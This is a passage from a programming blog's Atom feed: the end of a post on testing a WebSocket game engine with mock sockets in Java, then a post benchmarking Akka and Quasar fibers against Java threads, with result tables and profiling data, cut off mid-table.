                &lt;span class="s"&gt;"Invalid JSON: "&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;objectMapper&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;writeValueAsString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="n"&gt;iae&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;writeMove&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MockWebSocket&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;pit&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Throwable&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;objectMapper&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;valueToTree&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pit&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="nd"&gt;@Test&lt;/span&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;testJoin&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Throwable&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// Introduce the first user and read the "WaitingForOpponent" message.&lt;/span&gt;
    &lt;span class="n"&gt;MockWebSocket&lt;/span&gt; &lt;span class="n"&gt;fstSocket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;MockWebSocket&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Application&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;join&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
    &lt;span class="n"&gt;WaitingForOpponent&lt;/span&gt; &lt;span class="n"&gt;fstWfo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;readPojo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fstSocket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;WaitingForOpponent&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;assertThat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Application&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getPendingPlayers&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;size&lt;/span&gt;&lt;span class="o"&gt;()).&lt;/span&gt;&lt;span class="na"&gt;isEqualTo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;assertThat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Application&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getGames&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;size&lt;/span&gt;&lt;span class="o"&gt;()).&lt;/span&gt;&lt;span class="na"&gt;isEqualTo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

    &lt;span class="c1"&gt;// Introduce the second user and read the."WaitingForOpponent" message.&lt;/span&gt;
    &lt;span class="n"&gt;MockWebSocket&lt;/span&gt; &lt;span class="n"&gt;sndSocket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;MockWebSocket&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Application&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;join&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
    &lt;span class="n"&gt;WaitingForOpponent&lt;/span&gt; &lt;span class="n"&gt;sndWfo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;readPojo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sndSocket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;WaitingForOpponent&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;assertThat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fstWfo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;playerId&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sndWfo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;playerId&lt;/span&gt;&lt;span class="o"&gt;)).&lt;/span&gt;&lt;span class="na"&gt;isFalse&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;

    &lt;span class="c1"&gt;// Validate "ReadyToStart" messages.&lt;/span&gt;
    &lt;span class="n"&gt;ReadyToStart&lt;/span&gt; &lt;span class="n"&gt;fstRts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;readPojo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fstSocket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ReadyToStart&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;ReadyToStart&lt;/span&gt; &lt;span class="n"&gt;sndRts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;readPojo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sndSocket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ReadyToStart&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;assertThat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Application&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getGames&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;size&lt;/span&gt;&lt;span class="o"&gt;()).&lt;/span&gt;&lt;span class="na"&gt;isEqualTo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;assertThat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Application&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getPendingPlayers&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;size&lt;/span&gt;&lt;span class="o"&gt;()).&lt;/span&gt;&lt;span class="na"&gt;isEqualTo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;assertThat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fstRts&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;nextPlayerId&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;isEqualTo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sndRts&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;nextPlayerId&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;assertThat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fstRts&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;opponentId&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;isEqualTo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sndWfo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;playerId&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;assertThat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sndRts&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;opponentId&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;isEqualTo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fstWfo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;playerId&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

    &lt;span class="c1"&gt;// Let 2nd player make a move, while this is not his turn.&lt;/span&gt;
    &lt;span class="n"&gt;writeMove&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sndSocket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;IllegalMove&lt;/span&gt; &lt;span class="n"&gt;im&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;readPojo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sndSocket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IllegalMove&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;assertThat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;reason&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;isEqualTo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"It is opponent's turn."&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

    &lt;span class="c1"&gt;// Let 1st player make a move to an invalid pit index.&lt;/span&gt;
    &lt;span class="n"&gt;writeMove&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fstSocket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"n/a"&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;im&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;readPojo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fstSocket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IllegalMove&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;assertThat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;reason&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;matches&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"^Invalid pit index: .*"&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

    &lt;span class="c1"&gt;// Let 1st player make a move with a negative pit index.&lt;/span&gt;
    &lt;span class="n"&gt;writeMove&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fstSocket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;im&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;readPojo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fstSocket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IllegalMove&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;assertThat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;reason&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;matches&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"^Invalid pit index: .*"&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

    &lt;span class="c1"&gt;// ...&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I suppose I have got a nearly 99% code coverage of the game engine by using the
mock &lt;code&gt;WebSocket&lt;/code&gt;s. I hope this scheme would help others trying to do a similar
testing stuff.&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:vy.github.io,2014-08-07://blog/post/2014/09/01/java-fiber-test/</id>
    <title type="html">Testing Fiber Implementations in JVM</title>
    <published>2014-08-07T09:28:00Z</published>
    <updated>2014-08-07T09:28:00Z</updated>
    <link rel="alternate" href="https://vy.github.io//blog/post/2014/09/01/java-fiber-test/"/>
    <content type="html">
&lt;p&gt;I have always been interested in concurrent programming through the use of
threads. This inclination did not originate from a need to exploit the
parallelism at the hardware level for performance reasons, but rather due to the
fact that I believe it establishes a model of reasoning about your code that
provides a more convenient and natural way for encapsulating concurrency in the
overall program flow. I cannot express the relief I felt when I first ported an
asynchronous piece of networking code to
&lt;a href="http://en.wikipedia.org/wiki/POSIX_Threads"&gt;PThreads&lt;/a&gt;. But my joy did not last
long – context switching, memory, cache miss costs and more importantly the
physical constraints that bounds the number of threads were waiting for me at
the end of the tunnel. Lucky for me, it did not take much time to figure out the
notion of &lt;a href="http://en.wikipedia.org/wiki/Light-weight_process"&gt;Light-weight
processes&lt;/a&gt;, which later
introduced me to &lt;a href="http://dunkels.com/adam/pt/"&gt;Protothreads&lt;/a&gt;. That being said, I
should have admit that I fell back to my single-threaded asynchronous event loop
many times rather than a Protothreads flavored PThreads spaghetti. I suppose
every programmer had once dreamed about having light-weight threads that maps to
a multitude of physical CPU cores via some sort of mechanism in the background,
many similar efforts in the literature (&lt;a href="http://swtch.com/plan9port/man/man3/rfork.html"&gt;Plan9
rfork&lt;/a&gt;, &lt;a href="http://www.princeton.edu/~unix/Solaris/troubleshoot/process.html"&gt;Solaris
LWP&lt;/a&gt;, &lt;a href="http://www.daemon-systems.org/man/_lwp_create.2.html"&gt;NetBSD
lwp_create&lt;/a&gt;) backs this
claim, I suppose.&lt;/p&gt;

&lt;h1 id="threads-coroutines-and-fibers"&gt;Threads, Coroutines, and Fibers&lt;/h1&gt;

&lt;p&gt;The heart of the problem lies in the question of mapping &lt;script type="math/tex"&gt;m&lt;/script&gt; light-weight
threads to &lt;script type="math/tex"&gt;n&lt;/script&gt; physical processor cores (&lt;script type="math/tex"&gt;m \gg n&lt;/script&gt;) given that the operating
system has no prior knowledge on what is going on at the application level. As
an inevitable consequence of this problem, developers come up with the idea of
providing application level constructs to hint the underlying process scheduling
mechanism about the concurrency operating at the application level. Among many
other attempts, &lt;a href="http://en.wikipedia.org/wiki/Coroutine"&gt;coroutines&lt;/a&gt; and
&lt;a href="http://en.wikipedia.org/wiki/Fiber_(computer_science)"&gt;fibers&lt;/a&gt; are the two
well-known examples emanated from this research. Quoting from
&lt;a href="http://en.wikipedia.org/wiki/Fiber_(computer_science)"&gt;Wikipedia&lt;/a&gt;,&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Fibers describe essentially the same concept as coroutines. The distinction,
if there is any, is that coroutines are a language-level construct, a form of
control flow, while fibers are a systems-level construct, viewed as threads
that happen not to run concurrently. Priority is contentious; fibers may be
viewed as an implementation of coroutines, or as a substrate on which to
implement coroutines.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If I would try to restate the given description from a more naive perspective
targeting the Java Virtual Machine, &lt;em&gt;coroutines are language-level constructs to
form a way of cooperative execution of multiple tasks, whereas fibers are
light-weight threads scheduled preemptively by the virtual machine&lt;/em&gt;. There is &lt;a href="http://stackoverflow.com/questions/2846428/available-coroutine-libraries-in-java"&gt;a
set of coroutine
implementations&lt;/a&gt;
available for JVM, but in this post I will try to stick with two particular
fiber implementations: &lt;a href="http://akka.io/"&gt;Akka&lt;/a&gt; from
&lt;a href="http://typesafe.com/"&gt;Typesafe&lt;/a&gt; and
&lt;a href="http://docs.paralleluniverse.co/quasar/"&gt;Quasar&lt;/a&gt; from &lt;a href="http://paralleluniverse.co/"&gt;Parallel
Universe&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id="akka-and-quasar"&gt;Akka and Quasar&lt;/h1&gt;

&lt;p&gt;Last year I had a plenty amount of time to play around with
&lt;a href="http://akka.io/"&gt;Akka&lt;/a&gt; during the &lt;a href="https://www.coursera.org/course/reactive"&gt;The Principles of Reactive
Programming&lt;/a&gt; course. Claiming that
Akka is just a toolkit to realize fibers on the JVM would be a fairly incomplete
definition – it is totally much more than that. Designed for resiliency from
top to ground, a gigantic toolbox of common messaging pattern shortcuts,
adaptive load balancing, routing, partitioning, and configuration-driven
remoting, etc. just to name a few. Additionally, one should note that it is
battle-tested with real-world work loads by means of both as a standalone
application and a compound to the &lt;a href="https://typesafe.com/platform"&gt;Typesafe
Platform&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;On the other hand, &lt;a href="http://docs.paralleluniverse.co/quasar/"&gt;Quasar&lt;/a&gt; is a
relatively new player in this league. That being said, it is implemented as a
compact library with – in my opinion – a relatively sufficient set of
features. Though it has a lot to go to catch Akka in terms of out of the box
features. In addition, while Akka just provides
&lt;a href="http://en.wikipedia.org/wiki/Actor_model"&gt;actor&lt;/a&gt; abstractions at the
programming language level, Quasar ships both actors and fibers. (Actually,
Quasar actors are built on top of fibers.) Quoting from Quasar core developer
Ron Pressler’s
&lt;a href="https://groups.google.com/d/msg/quasar-pulsar-user/NrYOyUTqdcg/MFPl6S0USigJ"&gt;post&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Quasar and Akka provide completely different abstractions. Quasar provides
fibers while Akka provides an asynchronous-programming framework based on
callbacks. Both libraries then implement actors using their respective
abstractions. […] fibers are lightweight threads, which
means that their most important property – even before being light-weight –
is being threads. The thread abstraction is a series of sequential
computations with the ability to block – on IO or synchronization. Callbacks,
on the other hand, are a completely different abstraction. Akka’s callbacks
(and therefore actors), are not allowed to block, and therefore do not provide
a thread abstraction; hence they’re not fibers.&lt;/p&gt;

  &lt;p&gt;Quasar’s main design goal was the desire to make the simple, familiar,
threading abstraction (i.e., synchronous, blocking code) cheap, as kernel
threads are expensive, and blocking a kernel thread carries a lot of overhead.
Quasar is used to run servlets that serve hundreds of thousands of concurrent
requests – instead of mere thousands – all without changing your existing
Java code. We want developers get the full performance benefits of
asynchronous code – which Akka also offers – while keeping their APIs and
synchronous programming model – which Akka certainly doesn’t. Quasar makes
threading cheap, while Akka abandons the thread abstraction altogether. In
that respect, Quasar is a lot more similar to Erlang and Go (which, of course,
provided the inspiration to Quasar), which also use the thread abstraction but
provide a lightweight thread implementation.&lt;/p&gt;

  &lt;p&gt;Akka’s design goals are different, and we think Quasar is far simpler to use
than Akka, requires less mental overhead and far-less re-engineering, while at
the same time being more feature-rich.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id="the-benchmark"&gt;The Benchmark&lt;/h1&gt;

&lt;p&gt;In order to have an idea on how two implementations compare to each other in
terms of performance, I put together a small benchmark suite
(&lt;a href="https://github.com/vy/fiber-test/"&gt;fiber-test&lt;/a&gt;) that employs both Akka (2.3.5)
and Quasar (0.6.0) for the well-known
&lt;a href="http://www.sics.se/~joe/ericsson/du98024.html"&gt;thread-ring&lt;/a&gt; problem. (&lt;script type="math/tex"&gt;n&lt;/script&gt;
threads are spawned and connected as a ring structure. Through this ring a
message – an integer comprising 4 bytes – is circulated involving &lt;script type="math/tex"&gt;m&lt;/script&gt;
message passings.) In addition, I included a version of the benchmark that uses
Java Threads to establish a base line.&lt;/p&gt;

&lt;p&gt;In &lt;a href="https://github.com/vy/fiber-test/"&gt;fiber-test&lt;/a&gt;, you will observe that
&lt;a href="https://github.com/vy/fiber-test/blob/master/benchmark.sh"&gt;benchmark.sh&lt;/a&gt;
employs &lt;a href="http://linux.die.net/man/1/taskset"&gt;taskset&lt;/a&gt; to bond the JVM to a given
set of CPUs on the system. However, for small number (1-2) of CPUs, Quasar
freezes randomly and Java Threads become totally unresponsive. Hence, I get rid
off of the &lt;code&gt;taskset&lt;/code&gt; for the figures presented here.&lt;/p&gt;

&lt;p&gt;Tests are deployed on a Ubuntu GNU/Linux 14.04 (LTS) system running on a 6
physical core Intel(R) Xeon(R) E5645 2.40GHz processor, where 64-bit Java
HotSpot VM (build 1.8.0_20-ea-b05) is used.
&lt;a href="http://openjdk.java.net/projects/code-tools/jmh/"&gt;JMH&lt;/a&gt; is set to run 5+5 warmup
and regular iterations using 3 JVM forks. There are 503 threads in each
benchmark and 1e7 message passings. Results are in milliseconds per benchmark.&lt;/p&gt;

&lt;table id="results"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th&gt;Fiber Impl.&lt;/th&gt;
			&lt;th&gt;Min.&lt;/th&gt;
			&lt;th colspan="2"&gt;Avg.&lt;/th&gt;
			&lt;th&gt;Max.&lt;/th&gt;
			&lt;th&gt;Stddev.&lt;/th&gt;
			&lt;th colspan="3"&gt;Confidence Interval&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td&gt;Quasar Fibers&lt;/td&gt;
			&lt;td&gt;695.613&lt;/td&gt;
			&lt;td&gt;29x&lt;/td&gt;
			&lt;td&gt;721.457&lt;/td&gt;
			&lt;td&gt;758.231&lt;/td&gt;
			&lt;td&gt;20.796&lt;/td&gt;
			&lt;td&gt;99.9%&lt;/td&gt;
			&lt;td&gt;699.226&lt;/td&gt;
			&lt;td&gt;743.689&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td&gt;Akka Actors&lt;/td&gt;
			&lt;td&gt;856.807&lt;/td&gt;
			&lt;td&gt;23x&lt;/td&gt;
			&lt;td&gt;911.295&lt;/td&gt;
			&lt;td&gt;963.403&lt;/td&gt;
			&lt;td&gt;34.345&lt;/td&gt;
			&lt;td&gt;99.9%&lt;/td&gt;
			&lt;td&gt;874.578&lt;/td&gt;
			&lt;td&gt;948.012&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td&gt;Quasar Actors&lt;/td&gt;
			&lt;td&gt;1553.224&lt;/td&gt;
			&lt;td&gt;13x&lt;/td&gt;
			&lt;td&gt;1606.718&lt;/td&gt;
			&lt;td&gt;1660.329&lt;/td&gt;
			&lt;td&gt;35.756&lt;/td&gt;
			&lt;td&gt;99.9%&lt;/td&gt;
			&lt;td&gt;1568.492&lt;/td&gt;
			&lt;td&gt;1644.943&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td&gt;Java Threads&lt;/td&gt;
			&lt;td&gt;15730.028&lt;/td&gt;
			&lt;td&gt;1x&lt;/td&gt;
			&lt;td&gt;20709.233&lt;/td&gt;
			&lt;td&gt;33084.117&lt;/td&gt;
			&lt;td&gt;4338.423&lt;/td&gt;
			&lt;td&gt;99.9%&lt;/td&gt;
			&lt;td&gt;16071.196&lt;/td&gt;
			&lt;td&gt;25347.270&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;
&lt;style type="text/css"&gt;
table#results tbody tr td { text-align: right; }
table#results thead tr th { text-align: center; }
table#results td { padding: 1px; }
&lt;/style&gt;

&lt;div id="chartContainer" style="margin: 0 auto; height: 100px; width: 75%"&gt;&lt;/div&gt;
&lt;script type="text/javascript"&gt;
$(document).ready(function() {
	var chart = new CanvasJS.Chart("chartContainer", {
			backgroundColor: "transparent",
			creditText: null,
			axisX: {
				interval: 1,
				gridThickness: 0,
				labelFontSize: 10,
				labelFontStyle: "normal",
				labelFontWeight: "normal",
				labelFontFamily: "'Arial', sans"
			},
			axisY2: {
				labelFontSize: 10,
				labelFontStyle: "normal",
				labelFontWeight: "normal",
				labelFontFamily: "'Arial', sans",
				interlacedColor: "rgba(1,77,101,.2)",
				gridColor: "rgba(1,77,101,.1)"
			},
			data: [{
				type: "bar",
                name: "companies",
				axisYType: "secondary",
				color: "#014D65",
				dataPoints: [
					{y: 20709.233, label: "Java Threads"},
					{y: 1606.718, label: "Quasar Actors"},
					{y: 911.295, label: "Akka Actors"},
					{y: 721.457, label: "Quasar Fibers"}
				]
			}]
		});
	chart.render();
});
&lt;/script&gt;

&lt;p&gt;Results point out that even in the worst case (which corresponds to Quasar
Actors in the figures) fiber implementation on the average performs 13 times
better compared to native Java threads. In addition, Akka Actors and Quasar
Fibers improve this level up to 23x and 29x, respectively. All that being said
and done, I could not reason about the performance difference between Quasar
Fibers and Actors, given that actors are implemented using fibers in Quasar. In
order to further investigate the problem, I profiled the benchmarks using
&lt;code&gt;-agentlib:hprof=cpu=samples,interval=20,depth=3&lt;/code&gt;. (See
&lt;a href="http://docs.oracle.com/javase/7/docs/technotes/samples/hprof.html"&gt;HPROF&lt;/a&gt;
documentation for further information on the parameters.)&lt;/p&gt;

&lt;table id="hprof"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th&gt;rank&lt;/th&gt;
			&lt;th&gt;self&lt;/th&gt;
			&lt;th&gt;accum&lt;/th&gt;
			&lt;th&gt;count&lt;/th&gt;
			&lt;th&gt;trace&lt;/th&gt;
			&lt;th&gt;method&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;&lt;th colspan="6"&gt;Quasar Fibers&lt;/th&gt;&lt;/tr&gt;
		&lt;tr class="highlight"&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;47,55%&lt;/td&gt;
&lt;td&gt;47,55%&lt;/td&gt;
&lt;td&gt;67286&lt;/td&gt;
&lt;td&gt;300366&lt;/td&gt;
&lt;td&gt;co.paralleluniverse.fibers.Fiber.run1&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;47,48%&lt;/td&gt;
&lt;td&gt;95,04%&lt;/td&gt;
&lt;td&gt;67186&lt;/td&gt;
&lt;td&gt;300364&lt;/td&gt;
&lt;td&gt;com.github.vy.fibertest.QuasarFiberRingBenchmark$InternalFiber.run&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;3,37%&lt;/td&gt;
&lt;td&gt;98,40%&lt;/td&gt;
&lt;td&gt;4765&lt;/td&gt;
&lt;td&gt;300372&lt;/td&gt;
